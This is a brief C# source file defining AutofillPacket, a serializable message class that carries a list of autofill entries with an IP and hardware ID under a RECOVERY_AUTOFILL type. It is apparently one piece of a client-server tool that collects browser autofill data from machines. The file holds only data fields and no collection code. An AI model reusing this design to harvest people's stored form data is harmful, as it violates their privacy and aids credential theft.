using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class AutofillPacket : IPacket
    {
        //server
        public AutofillPacket() : base()
        {
            packetType = PacketType.RECOVERY_AUTOFILL;
        }

        //client
        public AutofillPacket(List<object[]> autofill, string baseIp, string HWID) : base()
        {

            packetType = PacketType.RECOVERY_AUTOFILL;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.autofillList = autofill;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<object[]> autofillList { get; set; }
    }
}
